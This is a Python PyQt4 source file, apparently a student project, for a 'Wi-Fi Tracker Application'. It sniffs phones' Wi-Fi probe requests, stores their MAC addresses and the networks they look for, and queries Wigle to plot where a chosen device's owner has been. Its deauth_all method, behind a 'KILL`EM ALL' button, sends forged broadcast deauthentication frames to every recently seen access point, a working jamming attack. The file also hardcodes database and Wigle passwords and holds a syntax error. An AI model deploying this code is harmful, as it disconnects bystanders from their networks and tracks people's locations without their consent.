#!/usr/bin/env python

from PyQt4 import QtGui, QtCore 	#QtGui - imports GUI; Qtcore - imports event handling (to make buttons do things)
import wifi_mon
import logging
from PyQt4.Qt import QWebView, QUrl
from wigle import Wigle, WigleRatelimitExceeded
from Outlog import OutLog
from impacket.dot11 import RadioTap
from scapy.layers.dot11 import Dot11Deauth, Dot11
from scapy.all import sendp
from gmplot.gmplot import GoogleMapPlotter
logging.getLogger("scapy.runtime").setLevel(logging.ERROR) # Shut up Scapy
import probe_scan
import psycopg2
import manuf
from psycopg2.extensions import ISOLATION_LEVEL_AUTOCOMMIT
import csv
import sys 
import os
import subprocess

class Window(QtGui.QMainWindow):				#Application inherit from QtGui.QMainWindow (also QWidget can be used); Window is an object

	# ===== Window ===== 

	def __init__(self):							#Defines Window (init method); from now, 'self' will reference to the window; 
										#everytime a window object is made the init method runs; Core of the application is in __init__
		super(Window, self).__init__()					#Super returnd parent object (which is QMainWindow);  () - Empty parameter
		self.setGeometry(50, 50, 1060, 650)				#Set the geometry of the window. (starting X; starting Y; width; length)
		self.setWindowTitle("Wi-Fi Tracker Application")		#Set title of the window (Window name)
		self.setWindowIcon(QtGui.QIcon('itb.png'))		
		
		# ===== Label for Picture ===== 
		
		pic = QtGui.QLabel(self)					#Placement for picture as without Map application look boring
		pic.setGeometry(490,50,550,550) 				#Set the geometry
		pic.setPixmap(QtGui.QPixmap(os.getcwd() + "/wifi-hack.jpg")) 	#Adding a picture, picture should be in application directory
		
		# ===== Frame for picture and Map ===== 
		
		frame = QtGui.QGroupBox(self)    				#frame for picture and map 
		frame.setTitle("Google Map")					#Set geometry for the frame
		frame.setGeometry(490,25,550,570)
		
		# ===== Console ===== 
		
		console = QtGui.QTextEdit(self)					#Console to show console output and errors 
		console.setGeometry (25,400,400,200)				#Set geometry for console
		sys.stdout = OutLog(console,sys.stdout)				#Prints output of the console in QTextEdit box
		sys.stderr = OutLog(console,sys.stderr, QtGui.QColor(255,0,0))	#Prints errors in QTextEdit box
		
		# ===== Frame for selected device ===== 
		
		frame1 = QtGui.QGroupBox(self)    
		frame1.setTitle("Selected Device")
		frame1.setGeometry(220,250,240,50)
		
		# ===== Label for for selected device box ===== 
		
		labelCombo = QtGui.QLabel(self)
		labelCombo.move(240,260)
		labelCombo.setText("<font style='color: red;'>NO DEVICE SELECTED</font>")
		labelCombo.resize(220,50)
		
		# ===== Main Menu ===== 
		
		monitorMode = QtGui.QAction("& Enable Monitor Mode", self)	#Defines action for Wi-Fi Monitor Mode
		monitorMode.setShortcut("Ctrl+M")				#Sets shortcut for Wi-Fi monitor mode action
		monitorMode.setStatusTip("Wi-Fi Monitor Mode")			#Information shown in the status bar (doesn't work in the linux)
		monitorMode.triggered.connect(self.wifi_monitor)		#Calls the method for enabling Wi-Fi monitor mode

		launchScan = QtGui.QAction("& Launch Probe Scan", self)		#Defines action for Scanning Probes
		launchScan.setShortcut("Ctrl+P")				#Sets shortcut for action
		launchScan.setStatusTip("Start Wi-Fi Scan")			#Information shown in the status bar (doesn't work in the linux)
		launchScan.triggered.connect(self.probe_scan)			#Calls the method for scanning probes

		cleardb = QtGui.QAction("& Clear database from records", self)	#Defines action for truncating tables
		cleardb.setShortcut("Ctrl+F")					#Sets shortcut for action
		cleardb.setStatusTip("Clear database")				#Information shown in the status bar 
		cleardb.triggered.connect(self.clear_db)			#Calls the method for truncating tables from DB
		
		updmanuf = QtGui.QAction("& Update oui file", self)		#Defines action for truncating tables
		updmanuf.setShortcut("Ctrl+M")					#Sets shortcut for action
		updmanuf.setStatusTip("Update oui file")			#Information shown in the status bar 
		updmanuf.triggered.connect(self.manufUpdate)			#Calls the method for truncating tables
		
		disable = QtGui.QAction("& Disable Monitor mode", self)		#Defines action for disabling monitor mode 
		disable.setShortcut("Ctrl+D")					#Sets shortcut for action
		disable.setStatusTip("Disabling monitor mode")			#Information shown in the status bar 
		disable.triggered.connect(self.disable_monitor)			#Calls the method to disable monitor mode
		
		deauthall = QtGui.QAction("& Deauthenticate all", self)		#Defines action for deauthenticating all devices around 
		deauthall.setShortcut("Ctrl+Z")					#Sets shortcut for action
		deauthall.setStatusTip("Deauthenticate all")			#Information shown in the status bar 
		deauthall.triggered.connect(self.deauth_all)			#Calls the method for deauthenticating all devices around
		
		quitAction = QtGui.QAction("& Exit Application", self)		#Defines action
		quitAction.setShortcut("Ctrl+Q")				#Sets shortcut for action
		quitAction.setStatusTip("Terminate the Application")		#Information shown in the status bar (doesn't work in the linux)
		quitAction.triggered.connect(self.close_application)		#Calls the method for closing the application
		
		
		self.statusBar()					#Calls the status bar (to show setStatusTip), nothing else is needed!
		
									
		mainMenu = self.menuBar()				#menuBar object is assigned to mainMenu, because we will need to modify it/add to it
		
		# ===== File Menu ===== 							
		
		fileMenu = mainMenu.addMenu('&Menu')			#Defines one line of menu and assigned it a name
		fileMenu.addAction(monitorMode)				#Adds action to the menu line - Wi-Fi Monitor Mode
		fileMenu.addAction(launchScan)				#Adds action to the menu line - Scanning Probes
		#fileMenu.addAction(plotMap)				#Adds action to the menu line - get coordinates and generate map	
		fileMenu.addAction(disable)				#Adds action to the menu line - disable wifi 	
		fileMenu.addAction(quitAction)				#Adds action to the menu line - Exit Application	
		
		# ===== File Menu 2 Options ===== 							
		
		fileMenu2 = mainMenu.addMenu('&Options')
		fileMenu2.addAction(cleardb)				#Adds action to the menu line - Clear DB
		fileMenu2.addAction(updmanuf)				#Adds action to the menu line - Clear DB
		fileMenu2.addAction(deauthall)				#Adds action to the menu line - Clear DB
		
		# ===== Label for Combobox ===== 							
		
		styleChoice = QtGui.QLabel("Choose device to analyze", self)	#Defines the style object with parameter (Name) -> Its the label saying what it is
		styleChoice.move(240, 25)					#Defines location of the style object on the screen (starting X; starting Y)
		styleChoice.resize(240,20)					#Defines size of the style choice
		
		# ===== Combobox ===== 							
		
		self.comboBx = QtGui.QComboBox(self)			#QComBox defines dropdown object
		self.comboBx.resize(240,20)				#Defines size of comboBox
		self.comboBx.move(220, 50)				#Defines location of the box on the screen (starting X; starting Y)
		self.comboBx.currentIndexChanged.connect(
			lambda: labelCombo.setText(self.comboBx.currentText()))
		self.comboBx.activated[str].connect(self.getCoordinates)	#Activate and display the default/current style/value and connect it to method style_choice
		
		# ===== Method to populate comboBox on startup ===== 							
		
		dropdown = self.getStations()				#Method to populate all stations from DB
		for item in dropdown:
			self.comboBx.addItem (str(item))
		
		
		self.home()						#Refers to the next method


	# ===== Main Window ===== 

	def home(self):							#Defines a method 'home' 

									#Button for Wi-Fi Monitor Mode
		btn1 = QtGui.QPushButton("Enable Monitor Mode", self)	#Defines a button with parameter name (!!! WHY PASS SELF ???)
		btn1.clicked.connect(self.wifi_monitor)			#Defines an event (through .connect), event is Monitor Mode
		btn1.resize(180, 40)					#Defines the size of the button (width; length) or PyQt suggest minimum size btn1.minimumSizeHint()
		btn1.move(25, 50)					#Defines location of the button on the screen (starting X; starting Y)
									#Button for Scanning Probes
		
		btn2 = QtGui.QPushButton("Launch Probe Scan", self)	#Defines a button with parameter name
		btn2.clicked.connect(self.probe_scan)			#Defines an event (through .connect), event is Scanning Probes
		btn2.resize(180, 40)					#Defines the size of the button (width; length)
		btn2.move(25, 120)					#Defines location of the button on the screen (starting X; starting Y)

									#Button for Exit Application
		btn3 = QtGui.QPushButton("Exit Application", self)	#Defines a button with parameter name
		btn3.clicked.connect(self.close_application)		#Defines an event (through .connect), event is Close Application
		btn3.resize(180, 40)					#Defines the size of the button (width; length)
		btn3.move(25, 330)					#Defines location of the button on the screen (starting X; starting Y)

									#Button to generate maps from probes
		btn4 = QtGui.QPushButton("Disable Monitor mode", self)	#Defines a button with parameter name (!!! WHY PASS SELF ???)
		btn4.clicked.connect(self.disable_monitor)		#Defines an event (through .connect), event is Monitor Mode
		btn4.resize(180, 40)					#Defines the size of the button (width; length) or PyQt suggest minimum size btn1.minimumSizeHint()
		btn4.move(25, 190)					#Defines location of the button on the screen (starting X; starting Y)

		btn5 = QtGui.QPushButton("Open SSIDs", self)		#Defines a button with parameter name (!!! WHY PASS SELF ???)
		btn5.clicked.connect(self.get_file)			#Defines an event (through .connect), event is Monitor Mode
		btn5.resize(180, 40)					#Defines the size of the button (width; length) or PyQt suggest minimum size btn1.minimumSizeHint()
		btn5.move(25, 260)					#Defines location of the button on the screen (starting X; starting Y)
		
		btn6 = QtGui.QPushButton("KILL`EM ALL", self)		#Defines a button with parameter name
		btn6.clicked.connect(self.deauth_all)			#Defines an event (through .connect), event is Scanning Probes
		btn6.resize(180, 40)					#Defines the size of the button (width; length)
		btn6.move(250, 330)					#Defines location of the button on the screen (starting X; starting Y)
		btn6.setStyleSheet("background-color: red")		#Defines color of the text 
		
		
		self.show()						#Shows the application in the end (call the graphics from memory and display it)


	# ===== Methods ===== 
	
	def wifi_monitor(self):						#Method to enable monitor mode on strongest interface. 
		try:							#Strongest considered wifi interface which can see most Wi-fi networks
			wifi_mon.start_mon_mode(iface)
			QtGui.QMessageBox.information(self, "Enabling Monitor Mode", "Monitor mode started on strongest interface %s"% (iface))
		except Exception, msg:
			QtGui.QMessageBox.information(self, "Enabling Monitor Mode", "Enabling monitor mode failed due to error: %s" % (msg,))
	
	def probe_scan(self):						#Method for wifi probes scanning 
		choice = QtGui.QMessageBox.question(self, "Start sniffing", "Start collecting probes on interface %s?"% (iface), QtGui.QMessageBox.Yes | QtGui.QMessageBox.No)
		if choice == QtGui.QMessageBox.Yes:			
			print("Starting probes collection")					#Sends a message to console
			handler = probe_scan.Handler()                				#this is a handler method from probe_scan.py which handles all process of sniffing
			sniff = probe_scan.sniff(iface=iface,prn=handler,store=0,timeout=60) 	#sniff method from scapy with parameters
			self.comboBx.clear()							#clearing combobox to populate from scratch
			dropdown = self.getStations()						#same method as above to get all stations, which have been seen in last 2 hours
			for item in dropdown:
				self.comboBx.addItem(str(item))					
		else:							#if/else statement - else (No)
			pass						#pass - nothing happens
	
	def deauth_all(self):						#Method for closing application
		choice = QtGui.QMessageBox.question(self, "Deauth all devices", "Are you completely sure that you want to do it?", QtGui.QMessageBox.Yes | QtGui.QMessageBox.No)
		if choice == QtGui.QMessageBox.Yes:			#if/else statement - if yes
			try:
				con = psycopg2.connect(database='wifi', user='probecap', host = 'localhost', password='pass')
				con.set_isolation_level(ISOLATION_LEVEL_AUTOCOMMIT)
				cur = con.cursor()
				try:
					cur.execute("""select distinct s.mac from beacon b join station s on b.station =s.id where b.seen > current_timestamp at time zone 'utc' - (30 * interval '10 minutes');""")
					ssids = [item[0] for item in cur.fetchall()]
					for ssid in ssids:
						print("All clients of following APs will be deauthed " + ssid)## wlan.fc.type_subtype eq 12  wireshark fil
						brdmac = "ff:ff:ff:ff:ff:ff"
						pkt = RadioTap() / Dot11(addr1 = brdmac, addr2 = ssid, addr3 = ssid) / Dot11Deauth()
						sendp(pkt, inter = .01, iface = iface, count = 10)
				except psycopg2.DatabaseError, e:
					print 'Error %s' % e    
				QtGui.QMessageBox.information(self, "Deauth", "Deauth Completed")
				cur.close()
				con.close()
			except Exception, msg:
				print msg
		else:							#if/else statement - else (No)
			pass						#pass - nothing happens
	
	def getStations(self):
		con = psycopg2.connect(database='wifi', user='probecap', host = 'localhost', password='pass')
		con.set_isolation_level(ISOLATION_LEVEL_AUTOCOMMIT)
		cur = con.cursor()
		try:
			cur.execute("""select distinct s.model, s.mac from station s where s.lastseen > current_timestamp at time zone 'utc' - (30 * interval '10 minutes') order by s.model;""")
			stations = cur.fetchall()
			except psycopg2.DatabaseError, e:
			print 'Error %s' % e    
		return stations
		cur.close()
		con.close()
		
	def getCoordinates(self,text):
		print ("Analyzing data for device: " + text)
		sep = ','
		text1 = str(text.split(sep, 1)[1])
		text1 = str(text1.strip(' )'))
		text1 = text1[1:-1]
		lats = []
		longis = [] 
		con = psycopg2.connect(database='wifi', user='probecap', host = 'localhost', password='pass')
		con.set_isolation_level(ISOLATION_LEVEL_AUTOCOMMIT)
		cur = con.cursor()
#######################Save all SSID of the selected phone to csv file##############################
		cur.execute("select distinct ss.name,st.model,st.mac from probe p join station st on st.id = p.station join ssid ss on p.ssid = ss.id where st.mac = %s;", (str(text1),)) 
		records = cur.fetchall()
		if records == ([]):
			print ("No SSIDs found")
		else:
			print ('Writing data to file %s.csv' % str(text))
			writer = csv.writer(open('%s.csv' % str(text) , 'w'))
			for row in records:
				writer.writerow(row)
#######################WIGLE search for each ssid of selected phone#################################	
		cur.execute("select distinct s.name from probe p join ssid s on p.ssid = s.id join station st on p.station = st.id where st.mac = %s;", (str(text1),))
		data = cur.fetchall()
		if data != ([]):
			for item in data:
				try:
					results = Wigle('itbstudent', 'p@SSW0RD').search(ssid=item,max_results=10) ###add more parameters to search, like lat and lon range for EIRE, time, etc.
				except WigleRatelimitExceeded:
						print("Cannot query Wigle - exceeded number of allowed requests")
				if results != ([]):
					for result in results:
						lat = ("%(trilat)s" % result)
						if lat != None:
							lats.append(float(lat))
						longi = ("%(trilong)s" % result)
						if longi != None:
							longis.append(float(longi))	
						print ("Loading coordinates: " + str(lats), str(longis))
						
						gmap = GoogleMapPlotter(53.404800, -6.378041, 9)
						plot = gmap.scatter(lats,longis,'k', marker=True)
						drawmap = gmap.draw("%s.html" % str(text,))
						web_page = QWebView(self)
						web_page.setGeometry(490,50,550,550)
						web_page.load(QUrl("%s.html" % str(text,)))
						web_page.show()
				else:
					print ("Wigle couldn`t find coordinates for " + str(item))	
					
	def close_application(self):		#Method for closing application
										#Pop up question box with yes/no option; parameters: self, Wwindow title, Question, Yes or No
		choice = QtGui.QMessageBox.question(self, "Exit Application", "Do you want to exit the application?", QtGui.QMessageBox.Yes | QtGui.QMessageBox.No)
		if choice == QtGui.QMessageBox.Yes:			#if/else statement - if yes
			sys.exit()					#Exit everything				
		else:							#if/else statement - else (No)
			pass		
	
	def get_file(self):
		file_name = QtGui.QFileDialog.getOpenFileName(self, "Open Data File", "", "CSV data files (*.csv)")
		if file_name:
			subprocess.call(["xdg-open", file_name])
			
	def disable_monitor(self):
		try:
			wifi_mon.remove_mon_iface(iface)
			os.system('service network-manager restart')
			QtGui.QMessageBox.information(self, "Disabling Monitor Mode", "Disabled Monitor mode on %s"% (iface,))
		except Exception, msg:
			print msg
	
			
	def clear_db(self):
		con = psycopg2.connect(database='wifi', user='probecap', host = 'localhost', password='pass')
		con.set_isolation_level(ISOLATION_LEVEL_AUTOCOMMIT)
		cur = con.cursor()
		try:
			cur.execute('TRUNCATE TABLE station, ssid, probe, beacon;')
			QtGui.QMessageBox.information(self, "Clearing Database", "Tables truncated")
		except psycopg2.DatabaseError, e:
			print 'Error %s' % e    
		cur.close()
		con.close()
		self.comboBx.clear()
		
	def manufUpdate(self):
		try:
			updateoui = manuf.MacParser()
			updateoui.refresh()
			QtGui.QMessageBox.information(self, "Updating oui file", "OUI Database file is updated")
		except Exception, msg:
			print msg

monitors, interfaces = wifi_mon.iwconfig()
iface = wifi_mon.get_iface(interfaces)

def run():							# Main Running Method (Function) - run()
	if os.geteuid():
		sys.exit('Please run as root')
	app = QtGui.QApplication(sys.argv)			# App definition (defines application); sys.argv allows to call
	GUI = Window()
	sys.exit(app.exec_())					# NO DESCRIPTION

run()								#Call 'run' to run code
